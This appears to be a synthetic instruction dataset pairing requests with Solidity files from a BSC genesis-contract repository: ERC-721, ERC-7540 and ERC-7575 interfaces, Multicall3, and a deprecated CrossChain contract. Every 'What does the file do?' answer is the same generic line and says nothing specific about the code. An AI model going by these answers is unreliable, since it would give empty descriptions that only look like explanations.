NFT,\n    /// (sort order not specified)\n    function tokenByIndex(uint256 _index) external view returns (uint256);\n\n    /// @notice Enumerate NFTs assigned to an owner\n    /// @dev Throws if `_index` >= `balanceOf(_owner)` or if\n    /// `_owner` is the zero address, representing invalid NFTs.\n    /// @param _owner An address where we are interested in NFTs owned by them\n    /// @param _index A counter less than `balanceOf(_owner)`\n    /// @return The token identifier for the `_index`th NFT assigned to `_owner`,\n    /// (sort order not specified)\n    function tokenOfOwnerByIndex(address _owner, uint256 _index) external view returns (uint256);\n}\n\n```"}
{"instruction": "What does the file IERC721.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {IERC165} from \"./IERC165.sol\";\n\n/// @title ERC-721 Non-Fungible Token Standard\n/// @dev See https://eips.ethereum.org/EIPS/eip-721\n/// Note: the ERC-165 identifier for this interface is 0x80ac58cd.\ninterface IERC721 is IERC165 {\n    /// @dev This emits when ownership of any NFT changes by any mechanism.\n    /// This event emits when NFTs are created (`from` == 0) and destroyed\n    /// (`to` == 0). Exception: during contract creation, any number of NFTs\n    /// may be created and assigned without emitting Transfer. At the time of\n    /// any transfer, the approved address for that NFT (if any) is reset to none.\n    event Transfer(address indexed _from, address indexed _to, uint256 indexed _tokenId);\n\n    /// @dev This emits when the approved address for an NFT is changed or\n    /// reaffirmed. The zero address indicates there is no approved address.\n    /// When a Transfer event emits, this also indicates that the approved\n    /// address for that NFT (if any) is reset to none.\n    event Approval(address indexed _owner, address indexed _approved, uint256 indexed _tokenId);\n\n    /// @dev This emits when an operator is enabled or disabled for an owner.\n    /// The operator can manage all NFTs of the owner.\n    event ApprovalForAll(address indexed _owner, address indexed _operator, bool _approved);\n\n    /// @notice Count all NFTs assigned to an owner\n    /// @dev NFTs assigned to the zero address are considered invalid, and this\n    /// function throws for queries about the zero address.\n    /// @param _owner An address for whom to query the balance\n    /// @return The number of NFTs owned by `_owner`, possibly zero\n    function balanceOf(address _owner) external view returns (uint256);\n\n    /// @notice Find the owner of an NFT\n    /// @dev NFTs assigned to zero address are considered invalid, and queries\n    /// about them do throw.\n    /// @param _tokenId The identifier for an NFT\n\n```", "output": "This file `IERC721.sol` is part of the interfaces project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IERC7540.sol which is part of the interfaces project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\interfaces\\IERC7540.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {IERC7575} from \"./IERC7575.sol\";\n\n/// @dev Interface of the base operator logic of ERC7540, as defined in\n/// https://eips.ethereum.org/EIPS/eip-7540\ninterface IERC7540Operator {\n    /**\n     * @dev The event emitted when an operator is set.\n     *\n     * @param controller The address of the controller.\n     * @param operator The address of the operator.\n     * @param approved The approval status.\n     */\n    event OperatorSet(address indexed controller, address indexed operator, bool approved);\n\n    /**\n     * @dev Sets or removes an operator for the caller.\n     *\n     * @param operator The address of the operator.\n     * @param approved The approval status.\n     * @return Whether the call was executed successfully or not\n     */\n    function setOperator(address operator, bool approved) external returns (bool);\n\n    /**\n     * @dev Returns `true` if the `operator` is approved as an operator for an `controller`.\n     *\n     * @param controller The address of the controller.\n     * @param operator The address of the operator.\n     * @return status The approval status\n     */\n    function isOperator(address controller, address operator) external view returns (bool status);\n}\n\n/// @dev Interface of the asynchronous deposit Vault interface of ERC7540, as defined in\n/// https://eips.ethereum.org/EIPS/eip-7540\ninterface IERC7540Deposit is IERC7540Operator {\n    event DepositRequest(\n        address indexed controller, address indexed owner, uint256 indexed requestId, address sender, uint256 assets\n    );\n    /**\n     * @dev Transfers assets from sender into the Vault and submits a Request for asynchronous deposit.\n     *\n     * - MUST support ERC-20 approve / transferFrom on asset as a deposit Request flow.\n     * - MUST revert if all of assets cannot be requested for deposit.\n     * - owner MUST be msg.sender unless some unspecified explicit approval is given by the caller,\n     *    approval of ERC-20 tokens from owner to sender is NOT enough.\n     *\n     * @param assets the amount of deposit assets to transfer from owner\n     * @param controller the controller of the request who will be able to operate the request\n     * @param owner the source of the deposit assets\n     *\n     * NOTE: most implementations will require pre-approval of the Vault with the Vault's underlying asset token.\n     */\n\n    function requestDeposit(uint256 assets, address controller, address owner) external returns (uint256 requestId);\n\n    /**\n     * @dev Returns the amount of requested assets in Pending state.\n     *\n     * - MUST NOT include any assets in Claimable state for deposit or mint.\n     * - MUST NOT show any variations depending on the caller.\n     * - MUST NOT revert unless due to integer overflow caused by an unreasonably large input.\n     */\n    function pendingDepositRequest(uint256 requestId, address controller) external view returns (uint256 pendingAssets);\n\n    /**\n     * @dev Returns the amount of requested assets in Claimable state for the controller to deposit or mint.\n     *\n     * - MUST NOT include any assets in Pending state.\n     * - MUST NOT show any variations depending on the caller.\n     * - MUST NOT revert unless due to integer overflow caused by an unreasonably large input.\n     */\n    function claimableDepositRequest(uint256 requestId, address controller)\n        external\n        view\n        returns (uint256 claimableAssets);\n\n    /**\n     * @dev Mints shares Vault shares to receiver by claiming the Request of the controller.\n     *\n     * - MUST emit the Deposit event.\n     * - controller MUST equal msg.sender unless the controller has approved the msg.sender as an operator.\n     */\n    function deposit(uint256 assets, address receiver, address controller) external returns (uint256 shares);\n\n    /**\n     * @dev Mints exactly shares Vault shares to receiver by claiming the Request of the controller.\n     *\n     * - MUST emit the Deposit event.\n     * - controller MUST equal msg.sender unless the controller has approved the msg.sender as an operator.\n     */\n    function mint(uint256 shares, address receiver, address controller) external returns (uint256 assets);\n}\n\n/// @dev Interface of the asynchronous deposit Vault interface of ERC7540, as defined in\n/// https://eips.ethereum.org/EIPS/eip-7540\ninterface IERC7540Redeem is IERC7540Operator {\n    event RedeemRequest(\n        address indexed controller, address indexed owner, uint256 indexed requestId, address sender, uint256 assets\n    );\n\n    /**\n     * @dev Assumes control of shares from sender into the Vault and submits a Request for asynchronous redeem.\n     *\n     * - MUST support a redeem Request flow where the control of shares is taken from sender directly\n     *   where msg.sender has ERC-20 approval over the shares of owner.\n     * - MUST revert if all of shares cannot be requested for redeem.\n     *\n     * @param shares the amount of shares to be redeemed to transfer from owner\n     * @param controller the controller of the request who will be able to operate the request\n     * @param owner the source of the shares to be redeemed\n     *\n     * NOTE: most implementations will require pre-approval of the Vault with the Vault's share token.\n     */\n    function requestRedeem(uint256 shares, address controller, address owner) external returns (uint256 requestId);\n\n    /**\n     * @dev Returns the amount of requested shares in Pending state.\n     *\n     * - MUST NOT include any shares in Claimable state for redeem or withdraw.\n     * - MUST NOT show any variations depending on the caller.\n     * - MUST NOT revert unless due to integer overflow caused by an unreasonably large input.\n     */\n    function pendingRedeemRequest(uint256 requestId, address controller) external view returns (uint256 pendingShares);\n\n    /**\n     * @dev Returns the amount of requested shares in Claimable state for the controller to redeem or withdraw.\n     *\n     * - MUST NOT include any shares in Pending state for redeem or withdraw.\n     * - MUST NOT show any variations depending on the caller.\n     * - MUST NOT revert unless due to integer overflow caused by an unreasonably large input.\n     */\n    function claimableRedeemRequest(uint256 requestId, address controller)\n        external\n        view\n        returns (uint256 claimableShares);\n}\n\n/// @dev Interface of the fully asynchronous Vault interface of ERC7540, as defined in\n/// https://eips.ethereum.org/EIPS/eip-7540\ninterface IERC7540 is IERC7540Deposit, IERC7540Redeem, IERC7575 {}\n\n```"}
{"instruction": "What does the file IERC7540.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {IERC7575} from \"./IERC7575.sol\";\n\n/// @dev Interface of the base operator logic of ERC7540, as defined in\n/// https://eips.ethereum.org/EIPS/eip-7540\ninterface IERC7540Operator {\n    /**\n     * @dev The event emitted when an operator is set.\n     *\n     * @param controller The address of the controller.\n     * @param operator The address of the operator.\n     * @param approved The approval status.\n     */\n    event OperatorSet(address indexed controller, address indexed operator, bool approved);\n\n    /**\n     * @dev Sets or removes an operator for the caller.\n     *\n     * @param operator The address of the operator.\n     * @param approved The approval status.\n     * @return Whether the call was executed successfully or not\n     */\n    function setOperator(address operator, bool approved) external returns (bool);\n\n    /**\n     * @dev Returns `true` if the `operator` is approved as an operator for an `controller`.\n     *\n     * @param controller The address of the controller.\n     * @param operator The address of the operator.\n     * @return status The approval status\n     */\n    function isOperator(address controller, address operator) external view returns (bool status);\n}\n\n/// @dev Interface of the asynchronous deposit Vault interface of ERC7540, as defined in\n/// https://eips.ethereum.org/EIPS/eip-7540\ninterface IERC7540Deposit is IERC7540Operator {\n    event DepositRequest(\n        address indexed controller, address indexed owner, uint256 indexed requestId, address sender, uint256 assets\n    );\n    /**\n     * @dev Transfers assets from sender into the Vault and submits a Request for asynchronous deposit.\n     *\n     * - MUST support ERC-20 approve / transferFrom on asset as a deposit Request flow.\n     * - MUST revert if all of assets cannot be requested for deposit.\n     * - owner MUST be msg.sender unless some unspecified explicit approval is given by the caller,\n     *   \n```", "output": "This file `IERC7540.sol` is part of the interfaces project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IERC7575.sol which is part of the interfaces project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\interfaces\\IERC7575.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {IERC165} from \"./IERC165.sol\";\n\n/// @dev Interface of the ERC7575 \"Multi-Asset ERC-4626 Vaults\", as defined in\n/// https://eips.ethereum.org/EIPS/eip-7575\ninterface IERC7575 is IERC165 {\n    event Deposit(address indexed sender, address indexed owner, uint256 assets, uint256 shares);\n    event Withdraw(\n        address indexed sender, address indexed receiver, address indexed owner, uint256 assets, uint256 shares\n    );\n\n    /**\n     * @dev Returns the address of the underlying token used for the Vault for accounting, depositing, and withdrawing.\n     *\n     * - MUST be an ERC-20 token contract.\n     * - MUST NOT revert.\n     */\n    function asset() external view returns (address assetTokenAddress);\n\n    /**\n     * @dev Returns the address of the share token\n     *\n     * - MUST be an ERC-20 token contract.\n     * - MUST NOT revert.\n     */\n    function share() external view returns (address shareTokenAddress);\n\n    /**\n     * @dev Returns the amount of shares that the Vault would exchange for the amount of assets provided, in an ideal\n     * scenario where all the conditions are met.\n     *\n     * - MUST NOT be inclusive of any fees that are charged against assets in the Vault.\n     * - MUST NOT show any variations depending on the caller.\n     * - MUST NOT reflect slippage or other on-chain conditions, when performing the actual exchange.\n     * - MUST NOT revert.\n     *\n     * NOTE: This calculation MAY NOT reflect the â€œper-userâ€ price-per-share, and instead should reflect the\n     * â€œaverage-userâ€™sâ€ price-per-share, meaning what the average user should expect to see when exchanging to and\n     * from.\n     */\n    function convertToShares(uint256 assets) external view returns (uint256 shares);\n\n    /**\n     * @dev Returns the amount of assets that the Vault would exchange for the amount of shares provided, in an ideal\n     * scenario where all the conditions are met.\n     *\n     * - MUST NOT be inclusive of any fees that are charged against assets in the Vault.\n     * - MUST NOT show any variations depending on the caller.\n     * - MUST NOT reflect slippage or other on-chain conditions, when performing the actual exchange.\n     * - MUST NOT revert.\n     *\n     * NOTE: This calculation MAY NOT reflect the â€œper-userâ€ price-per-share, and instead should reflect the\n     * â€œaverage-userâ€™sâ€ price-per-share, meaning what the average user should expect to see when exchanging to and\n     * from.\n     */\n    function convertToAssets(uint256 shares) external view returns (uint256 assets);\n\n    /**\n     * @dev Returns the total amount of the underlying asset that is â€œmanagedâ€ by Vault.\n     *\n     * - SHOULD include any compounding that occurs from yield.\n     * - MUST be inclusive of any fees that are charged against assets in the Vault.\n     * - MUST NOT revert.\n     */\n    function totalAssets() external view returns (uint256 totalManagedAssets);\n\n    /**\n     * @dev Returns the maximum amount of the underlying asset that can be deposited into the Vault for the receiver,\n     * through a deposit call.\n     *\n     * - MUST return a limited value if receiver is subject to some deposit limit.\n     * - MUST return 2 ** 256 - 1 if there is no limit on the maximum amount of assets that may be deposited.\n     * - MUST NOT revert.\n     */\n    function maxDeposit(address receiver) external view returns (uint256 maxAssets);\n\n    /**\n     * @dev Allows an on-chain or off-chain user to simulate the effects of their deposit at the current block, given\n     * current on-chain conditions.\n     *\n     * - MUST return as close to and no more than the exact amount of Vault shares that would be minted in a deposit\n     *   call in the same transaction. I.e. deposit should return the same or more shares as previewDeposit if called\n     *   in the same transaction.\n     * - MUST NOT account for deposit limits like those returned from maxDeposit and should always act as though the\n     *   deposit would be accepted, regardless if the user has enough tokens approved, etc.\n     * - MUST be inclusive of deposit fees. Integrators should be aware of the existence of deposit fees.\n     * - MUST NOT revert.\n     *\n     * NOTE: any unfavorable discrepancy between convertToShares and previewDeposit SHOULD be considered slippage in\n     * share price or some other type of condition, meaning the depositor will lose assets by depositing.\n     */\n    function previewDeposit(uint256 assets) external view returns (uint256 shares);\n\n    /**\n     * @dev Mints shares Vault shares to receiver by depositing exactly amount of underlying tokens.\n     *\n     * - MUST emit the Deposit event.\n     * - MAY support an additional flow in which the underlying tokens are owned by the Vault contract before the\n     *   deposit execution, and are accounted for during deposit.\n     * - MUST revert if all of assets cannot be deposited (due to deposit limit being reached, slippage, the user not\n     *   approving enough underlying tokens to the Vault contract, etc).\n     *\n     * NOTE: most implementations will require pre-approval of the Vault with the Vaultâ€™s underlying asset token.\n     */\n    function deposit(uint256 assets, address receiver) external returns (uint256 shares);\n\n    /**\n     * @dev Returns the maximum amount of the Vault shares that can be minted for the receiver, through a mint call.\n     * - MUST return a limited value if receiver is subject to some mint limit.\n     * - MUST return 2 ** 256 - 1 if there is no limit on the maximum amount of shares that may be minted.\n     * - MUST NOT revert.\n     */\n    function maxMint(address receiver) external view returns (uint256 maxShares);\n\n    /**\n     * @dev Allows an on-chain or off-chain user to simulate the effects of their mint at the current block, given\n     * current on-chain conditions.\n     *\n     * - MUST return as close to and no fewer than the exact amount of assets that would be deposited in a mint call\n     *   in the same transaction. I.e. mint should return the same or fewer assets as previewMint if called in the\n     *   same transaction.\n     * - MUST NOT account for mint limits like those returned from maxMint and should always act as though the mint\n     *   would be accepted, regardless if the user has enough tokens approved, etc.\n     * - MUST be inclusive of deposit fees. Integrators should be aware of the existence of deposit fees.\n     * - MUST NOT revert.\n     *\n     * NOTE: any unfavorable discrepancy between convertToAssets and previewMint SHOULD be considered slippage in\n     * share price or some other type of condition, meaning the depositor will lose assets by minting.\n     */\n    function previewMint(uint256 shares) external view returns (uint256 assets);\n\n    /**\n     * @dev Mints exactly shares Vault shares to receiver by depositing amount of underlying tokens.\n     *\n     * - MUST emit the Deposit event.\n     * - MAY support an additional flow in which the underlying tokens are owned by the Vault contract before the mint\n     *   execution, and are accounted for during mint.\n     * - MUST revert if all of shares cannot be minted (due to deposit limit being reached, slippage, the user not\n     *   approving enough underlying tokens to the Vault contract, etc).\n     *\n     * NOTE: most implementations will require pre-approval of the Vault with the Vaultâ€™s underlying asset token.\n     */\n    function mint(uint256 shares, address receiver) external returns (uint256 assets);\n\n    /**\n     * @dev Returns the maximum amount of the underlying asset that can be withdrawn from the owner balance in the\n     * Vault, through a withdraw call.\n     *\n     * - MUST return a limited value if owner is subject to some withdrawal limit or timelock.\n     * - MUST NOT revert.\n     */\n    function maxWithdraw(address owner) external view returns (uint256 maxAssets);\n\n    /**\n     * @dev Allows an on-chain or off-chain user to simulate the effects of their withdrawal at the current block,\n     * given current on-chain conditions.\n     *\n     * - MUST return as close to and no fewer than the exact amount of Vault shares that would be burned in a withdraw\n     *   call in the same transaction. I.e. withdraw should return the same or fewer shares as previewWithdraw if\n     *   called\n     *   in the same transaction.\n     * - MUST NOT account for withdrawal limits like those returned from maxWithdraw and should always act as though\n     *   the withdrawal would be accepted, regardless if the user has enough shares, etc.\n     * - MUST be inclusive of withdrawal fees. Integrators should be aware of the existence of withdrawal fees.\n     * - MUST NOT revert.\n     *\n     * NOTE: any unfavorable discrepancy between convertToShares and previewWithdraw SHOULD be considered slippage in\n     * share price or some other type of condition, meaning the depositor will lose assets by depositing.\n     */\n    function previewWithdraw(uint256 assets) external view returns (uint256 shares);\n\n    /**\n     * @dev Burns shares from owner and sends exactly assets of underlying tokens to receiver.\n     *\n     * - MUST emit the Withdraw event.\n     * - MAY support an additional flow in which the underlying tokens are owned by the Vault contract before the\n     *   withdraw execution, and are accounted for during withdraw.\n     * - MUST revert if all of assets cannot be withdrawn (due to withdrawal limit being reached, slippage, the owner\n     *   not having enough shares, etc).\n     *\n     * Note that some implementations will require pre-requesting to the Vault before a withdrawal may be performed.\n     * Those methods should be performed separately.\n     */\n    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);\n\n    /**\n     * @dev Returns the maximum amount of Vault shares that can be redeemed from the owner balance in the Vault,\n     * through a redeem call.\n     *\n     * - MUST return a limited value if owner is subject to some withdrawal limit or timelock.\n     * - MUST return balanceOf(owner) if owner is not subject to any withdrawal limit or timelock.\n     * - MUST NOT revert.\n     */\n    function maxRedeem(address owner) external view returns (uint256 maxShares);\n\n    /**\n     * @dev Allows an on-chain or off-chain user to simulate the effects of their redeemption at the current block,\n     * given current on-chain conditions.\n     *\n     * - MUST return as close to and no more than the exact amount of assets that would be withdrawn in a redeem call\n     *   in the same transaction. I.e. redeem should return the same or more assets as previewRedeem if called in the\n     *   same transaction.\n     * - MUST NOT account for redemption limits like those returned from maxRedeem and should always act as though the\n     *   redemption would be accepted, regardless if the user has enough shares, etc.\n     * - MUST be inclusive of withdrawal fees. Integrators should be aware of the existence of withdrawal fees.\n     * - MUST NOT revert.\n     *\n     * NOTE: any unfavorable discrepancy between convertToAssets and previewRedeem SHOULD be considered slippage in\n     * share price or some other type of condition, meaning the depositor will lose assets by redeeming.\n     */\n    function previewRedeem(uint256 shares) external view returns (uint256 assets);\n\n    /**\n     * @dev Burns exactly shares from owner and sends assets of underlying tokens to receiver.\n     *\n     * - MUST emit the Withdraw event.\n     * - MAY support an additional flow in which the underlying tokens are owned by the Vault contract before the\n     *   redeem execution, and are accounted for during redeem.\n     * - MUST revert if all of shares cannot be redeemed (due to withdrawal limit being reached, slippage, the owner\n     *   not having enough shares, etc).\n     *\n     * NOTE: some implementations will require pre-requesting to the Vault before a withdrawal may be performed.\n     * Those methods should be performed separately.\n     */\n    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);\n}\n\n/// @dev Interface of the ERC20 share token, as defined in\n/// https://eips.ethereum.org/EIPS/eip-7575\ninterface IERC7575Share is IERC165 {\n    event VaultUpdate(address indexed asset, address vault);\n\n    /**\n     * @dev Returns the address of the Vault for the given asset.\n     *\n     * @param asset the ERC-20 token to deposit with into the Vault\n     */\n    function vault(address asset) external view returns (address);\n}\n\n```"}
{"instruction": "What does the file IERC7575.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {IERC165} from \"./IERC165.sol\";\n\n/// @dev Interface of the ERC7575 \"Multi-Asset ERC-4626 Vaults\", as defined in\n/// https://eips.ethereum.org/EIPS/eip-7575\ninterface IERC7575 is IERC165 {\n    event Deposit(address indexed sender, address indexed owner, uint256 assets, uint256 shares);\n    event Withdraw(\n        address indexed sender, address indexed receiver, address indexed owner, uint256 assets, uint256 shares\n    );\n\n    /**\n     * @dev Returns the address of the underlying token used for the Vault for accounting, depositing, and withdrawing.\n     *\n     * - MUST be an ERC-20 token contract.\n     * - MUST NOT revert.\n     */\n    function asset() external view returns (address assetTokenAddress);\n\n    /**\n     * @dev Returns the address of the share token\n     *\n     * - MUST be an ERC-20 token contract.\n     * - MUST NOT revert.\n     */\n    function share() external view returns (address shareTokenAddress);\n\n    /**\n     * @dev Returns the amount of shares that the Vault would exchange for the amount of assets provided, in an ideal\n     * scenario where all the conditions are met.\n     *\n     * - MUST NOT be inclusive of any fees that are charged against assets in the Vault.\n     * - MUST NOT show any variations depending on the caller.\n     * - MUST NOT reflect slippage or other on-chain conditions, when performing the actual exchange.\n     * - MUST NOT revert.\n     *\n     * NOTE: This calculation MAY NOT reflect the â€œper-userâ€ price-per-share, and instead should reflect the\n     * â€œaverage-userâ€™sâ€ price-per-share, meaning what the average user should expect to see when exchanging to and\n     * from.\n     */\n    function convertToShares(uint256 assets) external view returns (uint256 shares);\n\n    /**\n     * @dev Returns the amount of assets that the Vault would exchange for the amount of shares provided, in an ideal\n     * scenario where all the conditions are met.\n     *\n  \n```", "output": "This file `IERC7575.sol` is part of the interfaces project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IMulticall3.sol which is part of the interfaces project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\interfaces\\IMulticall3.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\ninterface IMulticall3 {\n    struct Call {\n        address target;\n        bytes callData;\n    }\n\n    struct Call3 {\n        address target;\n        bool allowFailure;\n        bytes callData;\n    }\n\n    struct Call3Value {\n        address target;\n        bool allowFailure;\n        uint256 value;\n        bytes callData;\n    }\n\n    struct Result {\n        bool success;\n        bytes returnData;\n    }\n\n    function aggregate(Call[] calldata calls) external payable returns (uint256 blockNumber, bytes[] memory returnData);\n\n    function aggregate3(Call3[] calldata calls) external payable returns (Result[] memory returnData);\n\n    function aggregate3Value(Call3Value[] calldata calls) external payable returns (Result[] memory returnData);\n\n    function blockAndAggregate(Call[] calldata calls)\n        external\n        payable\n        returns (uint256 blockNumber, bytes32 blockHash, Result[] memory returnData);\n\n    function getBasefee() external view returns (uint256 basefee);\n\n    function getBlockHash(uint256 blockNumber) external view returns (bytes32 blockHash);\n\n    function getBlockNumber() external view returns (uint256 blockNumber);\n\n    function getChainId() external view returns (uint256 chainid);\n\n    function getCurrentBlockCoinbase() external view returns (address coinbase);\n\n    function getCurrentBlockDifficulty() external view returns (uint256 difficulty);\n\n    function getCurrentBlockGasLimit() external view returns (uint256 gaslimit);\n\n    function getCurrentBlockTimestamp() external view returns (uint256 timestamp);\n\n    function getEthBalance(address addr) external view returns (uint256 balance);\n\n    function getLastBlockHash() external view returns (bytes32 blockHash);\n\n    function tryAggregate(bool requireSuccess, Call[] calldata calls)\n        external\n        payable\n        returns (Result[] memory returnData);\n\n    function tryBlockAndAggregate(bool requireSuccess, Call[] calldata calls)\n        external\n        payable\n        returns (uint256 blockNumber, bytes32 blockHash, Result[] memory returnData);\n}\n\n```"}
{"instruction": "What does the file IMulticall3.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\ninterface IMulticall3 {\n    struct Call {\n        address target;\n        bytes callData;\n    }\n\n    struct Call3 {\n        address target;\n        bool allowFailure;\n        bytes callData;\n    }\n\n    struct Call3Value {\n        address target;\n        bool allowFailure;\n        uint256 value;\n        bytes callData;\n    }\n\n    struct Result {\n        bool success;\n        bytes returnData;\n    }\n\n    function aggregate(Call[] calldata calls) external payable returns (uint256 blockNumber, bytes[] memory returnData);\n\n    function aggregate3(Call3[] calldata calls) external payable returns (Result[] memory returnData);\n\n    function aggregate3Value(Call3Value[] calldata calls) external payable returns (Result[] memory returnData);\n\n    function blockAndAggregate(Call[] calldata calls)\n        external\n        payable\n        returns (uint256 blockNumber, bytes32 blockHash, Result[] memory returnData);\n\n    function getBasefee() external view returns (uint256 basefee);\n\n    function getBlockHash(uint256 blockNumber) external view returns (bytes32 blockHash);\n\n    function getBlockNumber() external view returns (uint256 blockNumber);\n\n    function getChainId() external view returns (uint256 chainid);\n\n    function getCurrentBlockCoinbase() external view returns (address coinbase);\n\n    function getCurrentBlockDifficulty() external view returns (uint256 difficulty);\n\n    function getCurrentBlockGasLimit() external view returns (uint256 gaslimit);\n\n    function getCurrentBlockTimestamp() external view returns (uint256 timestamp);\n\n    function getEthBalance(address addr) external view returns (uint256 balance);\n\n    function getLastBlockHash() external view returns (bytes32 blockHash);\n\n    function tryAggregate(bool requireSuccess, Call[] calldata calls)\n        external\n        payable\n        returns (Result[] memory returnData);\n\n    function tryBlockAndAggregate(bool requireSuccess, Cal\n```", "output": "This file `IMulticall3.sol` is part of the interfaces project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for CrossChain.sol which is part of the deprecated project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\deprecated\\CrossChain.sol`:\n\n```sol\npragma solidity 0.6.4;\n\nimport \"../interface/0.6.x/ICrossChain.sol\";\nimport \"../interface/0.6.x/ILightClient.sol\";\nimport \"../interface/0.6.x/IBSCValidatorSetV2.sol\";\nimport \"../lib/0.6.x/Memory.sol\";\nimport \"../interface/0.6.x/IParamSubscriber.sol\";\nimport \"../System.sol\";\n\ncontract CrossChain is System, ICrossChain, IParamSubscriber {\n    uint256 public constant INIT_BATCH_SIZE = 50;\n\n    // governable parameters\n    uint256 public batchSizeForOracle;  // @dev deprecated\n\n    //state variables\n    uint256 public previousTxHeight;\n    uint256 public txCounter;\n    int64 public oracleSequence;\n    mapping(uint8 => address) public channelHandlerContractMap;\n    mapping(address => mapping(uint8 => bool)) public registeredContractChannelMap;\n    mapping(uint8 => uint64) public channelSendSequenceMap;  // @dev deprecated\n    mapping(uint8 => uint64) public channelReceiveSequenceMap;\n    mapping(uint8 => bool) public isRelayRewardFromSystemReward;  // @dev deprecated\n\n    // to prevent the utilization of ancient block header\n    mapping(uint8 => uint64) public channelSyncedHeaderMap;\n\n    bool public isSuspended;\n    // proposal type hash => latest emergency proposal\n    mapping(bytes32 => EmergencyProposal) public emergencyProposals;  // @dev deprecated\n    // proposal type hash => the threshold of proposal approved\n    mapping(bytes32 => uint16) public quorumMap;  // @dev deprecated\n    // IAVL key hash => is challenged\n    mapping(bytes32 => bool) public challenged;  // @dev deprecated\n\n    // struct\n    // BEP-171: Security Enhancement for Cross-Chain Module\n    // @dev deprecated\n    struct EmergencyProposal {\n        uint16 quorum;\n        uint128 expiredAt;\n        bytes32 contentHash;\n        address[] approvers;\n    }\n\n    // event\n    // @dev deprecated\n    event crossChainPackage(\n        uint16 chainId,\n        uint64 indexed oracleSequence,\n        uint64 indexed packageSequence,\n        uint8 indexed channelId,\n        bytes payload\n    );\n    event receivedPackage(uint8 packageType, uint64 indexed packageSequence, uint8 indexed channelId);  // @dev deprecated\n    event unsupportedPackage(uint64 indexed packageSequence, uint8 indexed channelId, bytes payload);  // @dev deprecated\n    event unexpectedRevertInPackageHandler(address indexed contractAddr, string reason);  // @dev deprecated\n    event unexpectedFailureAssertionInPackageHandler(address indexed contractAddr, bytes lowLevelData);  // @dev deprecated\n    event paramChange(string key, bytes value);  // @dev deprecated\n    event enableOrDisableChannel(uint8 indexed channelId, bool isEnable);  // @dev deprecated\n    event addChannel(uint8 indexed channelId, address indexed contractAddr);  // @dev deprecated\n\n    // BEP-171: Security Enhancement for Cross-Chain Module\n    // @dev deprecated\n    event ProposalSubmitted(\n        bytes32 indexed proposalTypeHash,\n        address indexed proposer,\n        uint128 quorum,\n        uint128 expiredAt,\n        bytes32 contentHash\n    );\n    event Suspended(address indexed executor);  // @dev deprecated\n    event Reopened(address indexed executor);  // @dev deprecated\n    event SuccessChallenge(address indexed challenger, uint64 packageSequence, uint8 channelId);  // @dev deprecated\n\n    modifier sequenceInOrder(uint64 _sequence, uint8 _channelID) {\n        uint64 expectedSequence = channelReceiveSequenceMap[_channelID];\n        require(_sequence == expectedSequence, \"sequence not in order\");\n\n        channelReceiveSequenceMap[_channelID] = expectedSequence + 1;\n        _;\n    }\n\n    modifier blockSynced(uint64 _height) {\n        require(ILightClient(LIGHT_CLIENT_ADDR).isHeaderSynced(_height), \"light client not sync the block yet\");\n        _;\n    }\n\n    modifier channelSupported(uint8 _channelID) {\n        require(channelHandlerContractMap[_channelID] != address(0x0), \"channel is not supported\");\n        _;\n    }\n\n    modifier onlyRegisteredContractChannel(uint8 channleId) {\n        require(\n            registeredContractChannelMap[msg.sender][channleId], \"the contract and channel have not been registered\"\n        );\n        _;\n    }\n\n    modifier headerInOrder(uint64 height, uint8 channelId) {\n        require(height >= channelSyncedHeaderMap[channelId], \"too old header\");\n        if (height != channelSyncedHeaderMap[channelId]) {\n            channelSyncedHeaderMap[channelId] = height;\n        }\n        _;\n    }\n\n    // BEP-171: Security Enhancement for Cross-Chain Module\n    modifier onlyCabinet() {\n        uint256 indexPlus = IBSCValidatorSetV2(VALIDATOR_CONTRACT_ADDR).currentValidatorSetMap(msg.sender);\n        uint256 numOfCabinets = IBSCValidatorSetV2(VALIDATOR_CONTRACT_ADDR).numOfCabinets();\n        if (numOfCabinets == 0) {\n            numOfCabinets = 21;\n        }\n\n        require(indexPlus > 0 && indexPlus <= numOfCabinets, \"not cabinet\");\n        _;\n    }\n\n    modifier whenNotSuspended() {\n        require(!isSuspended, \"suspended\");\n        _;\n    }\n\n    modifier whenSuspended() {\n        require(isSuspended, \"not suspended\");\n        _;\n    }\n\n    function init() external onlyNotInit {\n        batchSizeForOracle = INIT_BATCH_SIZE;\n\n        oracleSequence = -1;\n        previousTxHeight = 0;\n        txCounter = 0;\n\n        alreadyInit = true;\n    }\n\n    function handlePackage(\n        bytes calldata payload,\n        bytes calldata proof,\n        uint64 height,\n        uint64 packageSequence,\n        uint8 channelId\n    )\n        external\n        onlyInit\n        onlyRelayer\n        sequenceInOrder(packageSequence, channelId)\n        blockSynced(height)\n        channelSupported(channelId)\n        headerInOrder(height, channelId)\n        whenNotSuspended\n    {\n        revert(\"deprecated\");\n    }\n\n    function sendSynPackage(\n        uint8 channelId,\n        bytes calldata msgBytes,\n        uint256 relayFee\n    ) external override onlyInit onlyRegisteredContractChannel(channelId) {\n        revert(\"deprecated\");\n    }\n\n    function updateParam(string 